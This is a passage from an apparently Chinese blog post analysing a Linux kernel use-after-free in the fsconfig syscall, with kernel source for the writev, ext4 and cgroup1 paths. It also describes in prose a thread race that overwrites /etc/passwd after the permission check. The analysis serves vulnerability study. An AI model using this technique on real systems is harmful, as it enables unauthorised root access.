SFMono-Regular, Consolas, ;">struct file</code> 结构（<code style="font-family: SFMono-Regular, Consolas, ;">fdt-&gt;fd[fd]</code>）。</p><p>如果引用计数不为 <code style="font-family: SFMono-Regular, Consolas, ;">1</code>，则调用 <code style="font-family: SFMono-Regular, Consolas, ;">__fget</code> 去获取指针，其中主要是调用了 <code style="font-family: SFMono-Regular, Consolas, ;">__fget_files</code> 函数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> get_file_rcu_many(x, cnt)        \<br />        atomic_long_add_unless(&amp;(x)-&gt;f_count, (cnt), 0)</span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *__fget_files(<span style="color: rgb(150, 203, 254);">struct</span> files_struct *files, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd,<br />                                 <span style="color: rgb(255, 255, 182);">fmode_t</span> mask, <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> refs)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file;<br />    rcu_read_lock();<br />loop:<br />    file = files_lookup_fd_rcu(files, fd);<br />    <span style="color: rgb(150, 203, 254);">if</span> (file) {<br />        <span style="color: rgb(124, 124, 124);">/* File object ref couldn't be taken.<br />                 * dup2() atomicity guarantee is the reason<br />                 * we loop to catch the new file (or NULL pointer)<br />                 */</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (file-&gt;f_mode &amp; mask)<br />            file = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />        <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (!get_file_rcu_many(file, refs))<br />            <span style="color: rgb(150, 203, 254);">goto</span> loop;<br />    }<br />    rcu_read_unlock();<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> file;<br />}<br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *__fget(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd, <span style="color: rgb(255, 255, 182);">fmode_t</span> mask,<br />                                  <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> refs)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> __fget_files(current-&gt;files, fd, mask, refs);<br />}<br /></code></pre><p>这里的 <code style="font-family: SFMono-Regular, Consolas, ;">files_lookup_fd_rcu</code> 直接可以认为是获取文件结构体的，随后判断里面是否包含禁止的模式，然后增加文件计数引用 （<code style="font-family: SFMono-Regular, Consolas, ;">get_file_rcu_many</code>）。</p><p>回过头来看看 <code style="font-family: SFMono-Regular, Consolas, ;">__fdget_pos</code> 函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> __fdget_pos(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> fd)<br />{<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> v = __fdget(fd);<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *file = (<span style="color: rgb(150, 203, 254);">struct</span> file *)(v &amp; ~<span style="color: rgb(255, 115, 253);">3</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (file &amp;&amp; (file-&gt;f_mode &amp; FMODE_ATOMIC_POS)) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (file_count(file) &gt; <span style="color: rgb(255, 115, 253);">1</span>) {<br />            v |= FDPUT_POS_UNLOCK;<br />            mutex_lock(&amp;file-&gt;f_pos_lock);<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> v;<br />}</code></pre><p>获取到的文件指针将最低两位置为 0（对齐），如果被设置了 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_ATOMIC_POS</code> 且 文件引用大于 1，那么上锁，到这里，才分析完 <code style="font-family: SFMono-Regular, Consolas, ;">do_writev</code> 的第一句话，来看看接下来的语句，重点是 <code style="font-family: SFMono-Regular, Consolas, ;">vfs_writev</code> 函数。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">do_iter_write</span>(<span style="color: rgb(150, 203, 254);">struct</span> file *file, <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *iter,<br />                <span style="color: rgb(255, 255, 182);">loff_t</span> *pos, <span style="color: rgb(255, 255, 182);">rwf_t</span> flags)<br />{<br />        <span style="color: rgb(255, 255, 182);">size_t</span> tot_len;<br />        <span style="color: rgb(255, 255, 182);">ssize_t</span> ret = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />        <span style="color: rgb(150, 203, 254);">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))<br />                <span style="color: rgb(150, 203, 254);">return</span> -EBADF;<br />        <span style="color: rgb(150, 203, 254);">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br /><br />        tot_len = iov_iter_count(iter);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!tot_len)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        ret = rw_verify_area(WRITE, file, pos, tot_len);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> ret;<br /><br />        <span style="color: rgb(150, 203, 254);">if</span> (file-&gt;f_op-&gt;write_iter)<br />                ret = do_iter_readv_writev(file, iter, pos, WRITE, flags);<br />        <span style="color: rgb(150, 203, 254);">else</span><br />                ret = do_loop_readv_writev(file, iter, pos, WRITE, flags);<br />        <span style="color: rgb(150, 203, 254);">if</span> (ret &gt; <span style="color: rgb(255, 115, 253);">0</span>)<br />                fsnotify_modify(file);<br />        <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">vfs_writev</span>(<span style="color: rgb(150, 203, 254);">struct</span> file *file, <span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> iovec __user *vec,<br />                          <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> vlen, <span style="color: rgb(255, 255, 182);">loff_t</span> *pos, <span style="color: rgb(255, 255, 182);">rwf_t</span> flags)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iovstack[UIO_FASTIOV];<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> *iov = iovstack;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iov_iter</span> iter;<br />    <span style="color: rgb(255, 255, 182);">ssize_t</span> ret;<br /><br />    ret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &amp;iov, &amp;iter);<br />    <span style="color: rgb(150, 203, 254);">if</span> (ret &gt;= <span style="color: rgb(255, 115, 253);">0</span>) {<br />        file_start_write(file);<br />        ret = do_iter_write(file, &amp;iter, pos, flags);<br />        file_end_write(file);<br />        kfree(iov);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>首先根据 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 的结构体解出数据和长度，然后调用 <code style="font-family: SFMono-Regular, Consolas, ;">do_iter_write</code> 去写文件，而在 <code style="font-family: SFMono-Regular, Consolas, ;">do_iter_write</code> 中可以发现，这里作权限校验了，校验了是否可写以及文件描述符是否可写，这里的两层意思分别是文件本身是否具有可写权限以及你打开的文件描述符是否包含了 <code style="font-family: SFMono-Regular, Consolas, ;">O_WRITE</code> 权限位。</p><p>随后进行写，写的过程会根据文件系统调用对应的写函数（<code style="font-family: SFMono-Regular, Consolas, ;">write_iter</code>）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(150, 203, 254);">inline</span> <span style="color: rgb(255, 255, 182);">ssize_t</span> <span style="color: rgb(255, 255, 182);">call_write_iter</span>(<span style="color: rgb(150, 203, 254);">struct</span> file *file, <span style="color: rgb(150, 203, 254);">struct</span> kiocb *kio,<br />                                      <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *iter)<br />{<br />    <span style="color: rgb(150, 203, 254);">return</span> file-&gt;f_op-&gt;write_iter(kio, iter);<br />}</code></pre><p>下面是完整的调用链，感兴趣可以跟一下。</p><p>do_writev-&gt;vfs_writev-&gt;do_iter_write-&gt;do_iter_readv_writev-&gt;call_write_iter-&gt;.write_iter -&gt; ext4_file_write_iter -&gt; ext4_buffered_write_iter</p><p>在这个函数里面可以看到我注释的两个位置分别对文件节点进行了上锁和解锁。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">static</span> ssize_t<br />    <span style="color: rgb(255, 255, 182);">ext4_file_write_iter</span>(<span style="color: rgb(150, 203, 254);">struct</span> kiocb *iocb, <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *<span style="color: rgb(150, 203, 254);">from</span>)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> inode *inode = file_inode(iocb-&gt;ki_filp);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))<br />        <span style="color: rgb(150, 203, 254);">return</span> -EIO;<br /><br /><span style="color: rgb(124, 124, 124);">#ifdef CONFIG_FS_DAX</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (IS_DAX(inode))<br />        <span style="color: rgb(150, 203, 254);">return</span> ext4_dax_write_iter(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">endif</span></span><br />    <span style="color: rgb(150, 203, 254);">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)<br />        <span style="color: rgb(150, 203, 254);">return</span> ext4_dio_write_iter(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br />    <span style="color: rgb(150, 203, 254);">else</span><br />        <span style="color: rgb(150, 203, 254);">return</span> ext4_buffered_write_iter(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br />}<br /><span style="color: rgb(150, 203, 254);">static</span> ssize_t <span style="color: rgb(255, 255, 182);">ext4_buffered_write_iter</span>(<span style="color: rgb(150, 203, 254);">struct</span> kiocb *iocb,<br />                                        <span style="color: rgb(150, 203, 254);">struct</span> iov_iter *<span style="color: rgb(150, 203, 254);">from</span>)<br />{<br />    ssize_t ret;<br />    <span style="color: rgb(150, 203, 254);">struct</span> inode *inode = file_inode(iocb-&gt;ki_filp);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT)<br />        <span style="color: rgb(150, 203, 254);">return</span> -EOPNOTSUPP;<br /><br />    ext4_fc_start_update(inode);<br />    inode_lock(inode);<span style="color: rgb(124, 124, 124);">//这里会上锁</span><br />    ret = ext4_write_checks(iocb, <span style="color: rgb(150, 203, 254);">from</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (ret &lt;= <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">goto</span> <span style="color: rgb(150, 203, 254);">out</span>;<br /><br />    current-&gt;backing_dev_info = inode_to_bdi(inode);<br />    ret = generic_perform_write(iocb-&gt;ki_filp, <span style="color: rgb(150, 203, 254);">from</span>, iocb-&gt;ki_pos);<br />    current-&gt;backing_dev_info = NULL;<br /><br />    <span style="color: rgb(150, 203, 254);">out</span>:<br />    inode_unlock(inode);<span style="color: rgb(124, 124, 124);">//这里会解锁</span><br />    ext4_fc_stop_update(inode);<br />    <span style="color: rgb(150, 203, 254);">if</span> (likely(ret &gt; <span style="color: rgb(255, 115, 253);">0</span>)) {<br />        iocb-&gt;ki_pos += ret;<br />        ret = generic_write_sync(iocb, ret);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>此时两个线程会卡在这个锁里，翻一翻时间节点，此时权限校验已经完了，第一个线程写入大量数据将第二个线程获取锁的时间，趁此机会第三个线程将 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 打开并将文件页面以这个 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code> 的页面使用，第二个线程获取锁之后直接将数据写入 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code>。</p><p>所以要彻底明白这个漏洞，还需要理解前面 UAF 的成因。</p><h3>fsconfig</h3><p>这个系统调用太大了，只介绍它原有的含义和触发漏洞的位置。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">SYSCALL_DEFINE5(fsconfig,<br />                <span style="color: rgb(255, 255, 182);">int</span>, fd,<br />                unsigned <span style="color: rgb(255, 255, 182);">int</span>, cmd,<br />                <span style="color: rgb(150, 203, 254);">const</span> char __user *, _key,<br />                <span style="color: rgb(150, 203, 254);">const</span> void __user *, _value,<br />                <span style="color: rgb(255, 255, 182);">int</span>, aux)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> fs_context *fc;<br />    <span style="color: rgb(150, 203, 254);">struct</span> fd f;<br />    <span style="color: rgb(255, 255, 182);">int</span> ret;<br />    <span style="color: rgb(255, 255, 182);">int</span> lookup_flags = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">struct</span> fs_parameter param = {<br />        .<span style="color: rgb(150, 203, 254);">type</span>        = fs_value_is_undefined,<br />    };<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />        <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br /><br />    <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FLAG:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || _value || aux)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_STRING:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || !_value || aux)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || !_value || aux &lt;= <span style="color: rgb(255, 115, 253);">0</span> || aux &gt; <span style="color: rgb(255, 115, 253);">1024</span> * <span style="color: rgb(255, 115, 253);">1024</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span style="color: rgb(255, 115, 253);">0</span>))<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />            <span style="color: rgb(150, 203, 254);">if</span> (!_key || _value || aux &lt; <span style="color: rgb(255, 115, 253);">0</span>)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_CMD_CREATE:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_CMD_RECONFIGURE:<br />            <span style="color: rgb(150, 203, 254);">if</span> (_key || _value || aux)<br />                <span style="color: rgb(150, 203, 254);">return</span> -EINVAL;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">default</span>:<br />            <span style="color: rgb(150, 203, 254);">return</span> -EOPNOTSUPP;<br />    }<br /><br />    f = fdget(fd);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!f.file)<br />        <span style="color: rgb(150, 203, 254);">return</span> -EBADF;<br />    ret = -EINVAL;<br />    <span style="color: rgb(150, 203, 254);">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br />        <span style="color: rgb(150, 203, 254);">goto</span> out_f;<br /><br />    fc = f.file-&gt;private_data;<br />    <span style="color: rgb(150, 203, 254);">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) {<br />        <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />                ret = -EOPNOTSUPP;<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_f;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (_key) {<br />        param.key = strndup_user(_key, <span style="color: rgb(255, 115, 253);">256</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.key)) {<br />            ret = PTR_ERR(param.key);<br />            <span style="color: rgb(150, 203, 254);">goto</span> out_f;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FLAG:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_flag;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_STRING:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_string;<br />            param.<span style="color: rgb(255, 255, 182);">string</span> = strndup_user(_value, <span style="color: rgb(255, 115, 253);">256</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.<span style="color: rgb(255, 255, 182);">string</span>)) {<br />                ret = PTR_ERR(param.<span style="color: rgb(255, 255, 182);">string</span>);<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            }<br />            param.size = strlen(param.<span style="color: rgb(255, 255, 182);">string</span>);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_blob;<br />            param.size = aux;<br />            param.blob = memdup_user_nul(_value, aux);<br />            <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.blob)) {<br />                ret = PTR_ERR(param.blob);<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            }<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            lookup_flags = LOOKUP_EMPTY;<br />            <span style="color: rgb(150, 203, 254);">fallthrough</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_filename;<br />            param.name = getname_flags(_value, lookup_flags, NULL);<br />            <span style="color: rgb(150, 203, 254);">if</span> (IS_ERR(param.name)) {<br />                ret = PTR_ERR(param.name);<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            }<br />            param.dirfd = aux;<br />            param.size = strlen(param.name-&gt;name);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />            param.<span style="color: rgb(150, 203, 254);">type</span> = fs_value_is_file;<br />            ret = -EBADF;<br />            param.file = fget(aux);<br />            <span style="color: rgb(150, 203, 254);">if</span> (!param.file)<br />                <span style="color: rgb(150, 203, 254);">goto</span> out_key;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">default</span>:<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br /><br />    ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br />    <span style="color: rgb(150, 203, 254);">if</span> (ret == <span style="color: rgb(255, 115, 253);">0</span>) {<br />        ret = vfs_fsconfig_locked(fc, cmd, ¶m);<br />        mutex_unlock(&amp;fc-&gt;uapi_mutex);<br />    }<br /><br />    <span style="color: rgb(124, 124, 124);">/* Clean up the our record of any value that we obtained from<br />         * userspace.  Note that the value may have been stolen by the LSM or<br />         * filesystem, in which case the value pointer will have been cleared.<br />         */</span><br />    <span style="color: rgb(150, 203, 254);">switch</span> (cmd) {<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_STRING:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_BINARY:<br />            kfree(param.<span style="color: rgb(255, 255, 182);">string</span>);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH:<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_PATH_EMPTY:<br />            <span style="color: rgb(150, 203, 254);">if</span> (param.name)<br />                putname(param.name);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">case</span> FSCONFIG_SET_FD:<br />            <span style="color: rgb(150, 203, 254);">if</span> (param.file)<br />                fput(param.file);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        <span style="color: rgb(150, 203, 254);">default</span>:<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    out_key:<br />    kfree(param.key);<br />    out_f:<br />    fdput(f);<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}</code></pre><p>这个系统调用允许挂载自己的文件系统而不用修改内核，它在调用的过程中存在类型混淆漏洞。</p><p>在选项 5 有个可以释放文件的操作 <code style="font-family: SFMono-Regular, Consolas, ;">FSCONFIG_SET_FD</code>，在解释参数的时候，会调用到下面的函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">int <span style="color: rgb(255, 255, 182);">vfs_parse_fs_param</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_parameter</span> *param)<br />{<br />        int ret;<br /><br />        <span style="color: rgb(255, 255, 182);">if</span> (!param-&gt;key)<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"Unnamed parameter\n"</span>);<br /><br />        ret = <span style="color: rgb(255, 255, 182);">vfs_parse_sb_flag</span>(fc, param-&gt;key);<br />        <span style="color: rgb(255, 255, 182);">if</span> (ret != -ENOPARAM)<br />                <span style="color: rgb(150, 203, 254);">return</span> ret;<br /><br />        ret = <span style="color: rgb(255, 255, 182);">security_fs_context_parse_param</span>(fc, param);<br />        <span style="color: rgb(255, 255, 182);">if</span> (ret != -ENOPARAM)<br />                <span style="color: rgb(124, 124, 124);">/* Param belongs to the LSM or is disallowed by the LSM; so<br />                 * don't pass to the FS.<br />                 */</span><br />                <span style="color: rgb(150, 203, 254);">return</span> ret;<br /><br />        <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;ops-&gt;parse_param) {<br />                ret = fc-&gt;ops-&gt;<span style="color: rgb(255, 255, 182);">parse_param</span>(fc, param);<span style="color: rgb(124, 124, 124);">//这个地方调用了cgroup1_parse_param</span><br />                <span style="color: rgb(255, 255, 182);">if</span> (ret != -ENOPARAM)<br />                        <span style="color: rgb(150, 203, 254);">return</span> ret;<br />        }<br /><br />        <span style="color: rgb(124, 124, 124);">/* If the filesystem doesn't take any arguments, give it the<br />         * default handling of source.<br />         */</span><br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>(param-&gt;key, <span style="color: rgb(168, 255, 96);">"source"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />                <span style="color: rgb(255, 255, 182);">if</span> (param-&gt;<span style="color: rgb(150, 203, 254);">type</span> != fs_value_is_string)<br />                        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"VFS: Non-string source"</span>);<br />                <span style="color: rgb(255, 255, 182);">if</span> (fc-&gt;source)<br />                        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"VFS: Multiple sources"</span>);<br />                fc-&gt;source = param-&gt;string;<br />                param-&gt;string = NULL;<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br /><br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 255, 182);">invalf</span>(fc, <span style="color: rgb(168, 255, 96);">"%s: Unknown parameter '%s'"</span>,<br />                      fc-&gt;fs_type-&gt;name, param-&gt;key);<br />}<br /><br />int <span style="color: rgb(255, 255, 182);">cgroup1_parse_param</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_context</span> *fc, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">fs_parameter</span> *param)<br />{<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">cgroup_fs_context</span> *ctx = <span style="color: rgb(255, 255, 182);">cgroup_fc2context</span>(fc);<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">cgroup_subsys</span> *ss;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: 